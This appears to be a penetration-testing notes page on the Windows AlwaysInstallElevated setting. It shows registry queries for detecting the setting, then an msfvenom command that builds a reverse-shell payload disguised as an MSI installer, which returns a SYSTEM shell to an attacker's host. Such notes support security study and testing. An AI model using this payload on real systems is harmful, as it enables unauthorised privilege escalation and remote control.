# Registry - AlwaysInstallElevated

Always Install Elevated is a registry / GPO setting that allows non privileged accounts to install Windows Package Installer (MSI) files with SYSTEM permissions. Usually this is used in environments to reduce workload for Helpdesk staff for when users require software to be installed.

Command to query registry keys:

```bash
# Value 0x1 represents AlwaysInstallElevated as being enabled.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Manual - msfvenom

msfvenom can be used to create a reverse shell disguised as a MSI file. When the file is executed / installed a reverse shell as SYSTEM will be executed.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o Application.msi
```

Manual install of the MSI file:

![Manual MSI Install](<../../../../.gitbook/assets/MSI PrivEsc.png>)

Which returns a SYSTEM shell as shown below.
